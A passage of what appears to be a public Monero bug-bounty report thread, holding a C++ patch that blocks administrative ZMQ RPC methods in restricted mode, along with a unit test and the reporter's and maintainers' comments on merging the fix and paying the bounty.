     const auto last_sorted = std::is_sorted_until(std::begin(handlers), std::end(handlers));
     if (last_sorted != std::end(handlers))
       throw std::logic_error{std::string{"ZMQ JSON-RPC handlers map is not properly sorted, see "} + last_sorted->method_name};
+
+    check_blocked_methods_sorted();
   }
 
   void DaemonHandler::handle(const GetHeight::Request& req, GetHeight::Response& res)
@@ -928,6 +931,14 @@ namespace rpc
       FullMessage req_full(std::move(request), true);
 
       const std::string request_type = req_full.getRequestType();
+      if (m_restricted && is_blocked_in_restricted_mode(request_type))
+      {
+        Message fail;
+        fail.status = Message::STATUS_FAILED;
+        fail.error_details = "\"" + request_type + "\" is not available in restricted mode.";
+        return FullMessage::getResponse(fail, req_full.getID());
+      }
+
       const auto matched_handler = std::lower_bound(std::begin(handlers), std::end(handlers), request_type);
       if (matched_handler == std::end(handlers) || matched_handler->method_name != request_type)
         return BAD_REQUEST(request_type, req_full.getID());
diff --git a/src/rpc/daemon_handler.h b/src/rpc/daemon_handler.h
index 1da5419d2..87aaf086a 100644
--- a/src/rpc/daemon_handler.h
+++ b/src/rpc/daemon_handler.h
@@ -51,7 +51,7 @@ class DaemonHandler : public RpcHandler
 {
   public:
 
-    DaemonHandler(cryptonote::core& c, t_p2p& p2p);
+    DaemonHandler(cryptonote::core& c, t_p2p& p2p, bool restricted = false);
 
     ~DaemonHandler() { }
 
@@ -143,6 +143,7 @@ class DaemonHandler : public RpcHandler
 
     cryptonote::core& m_core;
     t_p2p& m_p2p;
+    bool m_restricted;
 };
 
 }  // namespace rpc
diff --git a/src/rpc/zmq_restricted_methods.cpp b/src/rpc/zmq_restricted_methods.cpp
new file mode 100644
index 000000000..eb58fd3d2
--- /dev/null
+++ b/src/rpc/zmq_restricted_methods.cpp
@@ -0,0 +1,73 @@
+// Copyright (c) 2016-2026, The Monero Project
+//
+// All rights reserved.
+//
+// Redistribution and use in source and binary forms, with or without modification, are
+// permitted provided that the following conditions are met:
+//
+// 1. Redistributions of source code must retain the above copyright notice, this list of
+//    conditions and the following disclaimer.
+//
+// 2. Redistributions in binary form must reproduce the above copyright notice, this list
+//    of conditions and the following disclaimer in the documentation and/or other
+//    materials provided with the distribution.
+//
+// 3. Neither the name of the copyright holder nor the names of its contributors may be
+//    used to endorse or promote products derived from this software without specific
+//    prior written permission.
+//
+// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY
+// EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
+// MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
+// THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
+// SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
+// PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
+// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
+// STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF
+// THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+
+#include "rpc/zmq_restricted_methods.h"
+
+#include <algorithm>
+#include <array>
+
+namespace cryptonote
+{
+namespace rpc
+{
+  namespace
+  {
+    const std::array<boost::string_ref, 9> blocked_in_restricted_mode{{
+      "flush_txpool",
+      "get_peer_list",
+      "mining_status",
+      "relay_tx",
+      "save_bc",
+      "set_log_categories",
+      "set_log_level",
+      "start_mining",
+      "stop_mining"
+    }};
+  }
+
+  bool is_blocked_in_restricted_mode(const boost::string_ref method) noexcept
+  {
+    return std::binary_search(
+      blocked_in_restricted_mode.begin(),
+      blocked_in_restricted_mode.end(),
+      method
+    );
+  }
+
+  void check_blocked_methods_sorted()
+  {
+    const auto last =
+      std::is_sorted_until(blocked_in_restricted_mode.begin(), blocked_in_restricted_mode.end());
+
+    if (last != blocked_in_restricted_mode.end())
+      throw std::logic_error{
+        std::string{"ZMQ restricted-method map is not properly sorted, see "} + last->to_string()
+      };
+  }
+} // rpc
+} // cryptonote
diff --git a/src/rpc/zmq_restricted_methods.h b/src/rpc/zmq_restricted_methods.h
new file mode 100644
index 000000000..28f2dd0a1
--- /dev/null
+++ b/src/rpc/zmq_restricted_methods.h
@@ -0,0 +1,45 @@
+// Copyright (c) 2016-2026, The Monero Project
+//
+// All rights reserved.
+//
+// Redistribution and use in source and binary forms, with or without modification, are
+// permitted provided that the following conditions are met:
+//
+// 1. Redistributions of source code must retain the above copyright notice, this list of
+//    conditions and the following disclaimer.
+//
+// 2. Redistributions in binary form must reproduce the above copyright notice, this list
+//    of conditions and the following disclaimer in the documentation and/or other
+//    materials provided with the distribution.
+//
+// 3. Neither the name of the copyright holder nor the names of its contributors may be
+//    used to endorse or promote products derived from this software without specific
+//    prior written permission.
+//
+// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY
+// EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
+// MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
+// THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
+// SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
+// PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
+// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
+// STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF
+// THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+
+#pragma once
+
+#include <stdexcept>
+#include <boost/utility/string_ref.hpp>
+
+namespace cryptonote
+{
+namespace rpc
+{
+  //! Returns true when `method` must be rejected while ZMQ RPC runs in
+  //! restricted mode. Keep this list in sync with daemon RPC method
+  bool is_blocked_in_restricted_mode(boost::string_ref method) noexcept;
+
+  //! Throws std::logic_error if the internal method table is not sorted.
+  void check_blocked_methods_sorted();
+} // rpc
+} // cryptonote
diff --git a/src/rpc/zmq_server.cpp b/src/rpc/zmq_server.cpp
index d99f4fb7d..4926e4549 100644
--- a/src/rpc/zmq_server.cpp
+++ b/src/rpc/zmq_server.cpp
@@ -36,6 +36,7 @@
 
 #include "byte_slice.h"
 #include "rpc/zmq_pub.h"
+#include "rpc/rpc_handler.h"
 
 #undef MONERO_DEFAULT_LOG_CATEGORY
 #define MONERO_DEFAULT_LOG_CATEGORY "net.zmq"
diff --git a/src/rpc/zmq_server.h b/src/rpc/zmq_server.h
index c72730a63..b2a9ba0cc 100644
--- a/src/rpc/zmq_server.h
+++ b/src/rpc/zmq_server.h
@@ -38,7 +38,6 @@
 #include "cryptonote_basic/fwd.h"
 #include "net/zmq.h"
 #include "rpc/fwd.h"
-#include "rpc/rpc_handler.h"
 #include "span.h"
 
 namespace cryptonote
@@ -46,6 +45,7 @@ namespace cryptonote
 
 namespace rpc
 {
+    class RpcHandler;
 
 class ZmqServer final
 {
diff --git a/tests/unit_tests/zmq_rpc.cpp b/tests/unit_tests/zmq_rpc.cpp
index 240251d1b..2997ef7e1 100644
--- a/tests/unit_tests/zmq_rpc.cpp
+++ b/tests/unit_tests/zmq_rpc.cpp
@@ -39,6 +39,7 @@
 #include "net/zmq.h"
 #include "rpc/message.h"
 #include "rpc/zmq_pub.h"
+#include "rpc/zmq_restricted_methods.h"
 #include "rpc/zmq_server.h"
 #include "serialization/json_object.h"
 
@@ -69,6 +70,23 @@ TEST(ZmqFullMessage, Request)
   EXPECT_STREQ("foo", parsed.getRequestType().c_str());
 }
 
+TEST(ZmqRestrictedMethods, BasicCoverage)
+{
+  EXPECT_TRUE(cryptonote::rpc::is_blocked_in_restricted_mode("flush_txpool"));
+  EXPECT_TRUE(cryptonote::rpc::is_blocked_in_restricted_mode("get_peer_list"));
+  EXPECT_TRUE(cryptonote::rpc::is_blocked_in_restricted_mode("mining_status"));
+  EXPECT_TRUE(cryptonote::rpc::is_blocked_in_restricted_mode("relay_tx"));
+  EXPECT_TRUE(cryptonote::rpc::is_blocked_in_restricted_mode("save_bc"));
+  EXPECT_TRUE(cryptonote::rpc::is_blocked_in_restricted_mode("set_log_categories"));
+  EXPECT_TRUE(cryptonote::rpc::is_blocked_in_restricted_mode("set_log_level"));
+  EXPECT_TRUE(cryptonote::rpc::is_blocked_in_restricted_mode("start_mining"));
+  EXPECT_TRUE(cryptonote::rpc::is_blocked_in_restricted_mode("stop_mining"));
+
+  EXPECT_FALSE(cryptonote::rpc::is_blocked_in_restricted_mode("get_height"));
+  EXPECT_FALSE(cryptonote::rpc::is_blocked_in_restricted_mode("get_info"));
+  EXPECT_FALSE(cryptonote::rpc::is_blocked_in_restricted_mode("send_raw_tx"));
+}
+
 namespace
 {
   using published_json = std::pair<std::string, rapidjson::Document>;
```

Could you review this suggested patch? We had to use C++14 for release branch so no `std::string_view`.
- **2026-03-27** @usagirabbit: Currently heading home, will test momentarily
- **2026-03-30** @usagirabbit: Patch worked in my enviroment, any updates?
- **2026-03-30** @selsta: https://github.com/monero-project/monero/pull/10386
- **2026-04-01** @usagirabbit: This commit was merged, would I recieve a bounty soon?
- **2026-04-01** @selsta: https://github.com/monero-project/monero/pull/10389

I linked to the wrong pull request. Yes, this qualifies for a low severity bounty. I don't know yet when it will be paid out.
- **2026-04-01** @usagirabbit: Thanks :)
- **2026-04-03** @usagirabbit: @luigi1111w thought i'd @ you here considering you paid out all of my previous bounties
- **2026-04-03** @usagirabbit: i dont know if that works on hackerone lol, hopefully it does
- **2026-04-03** @selsta: There's no need to ping anyone, the bounty payout should happen within the next 2 weeks.
- **2026-04-03** @usagirabbit: gotcha, sorry
- **2026-04-10** @usagirabbit: Any updates?
- **2026-04-10** @selsta: See my previous message.
- **2026-04-16** @usagirabbit: Hello! The 2 week deadline is approaching tomorrow. I was wondering if there were any updates?
- **2026-04-16** @selsta: I forwarded all the payout requests to luigi, I don't know when he will have time but I can ping him again.
- **2026-04-19** @luigi1111w: Sent 0.5 XMR: 5d80f57c9319df085e94268c92b672193eebf74055b110a459f472ce7215aec6
- **Swag Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
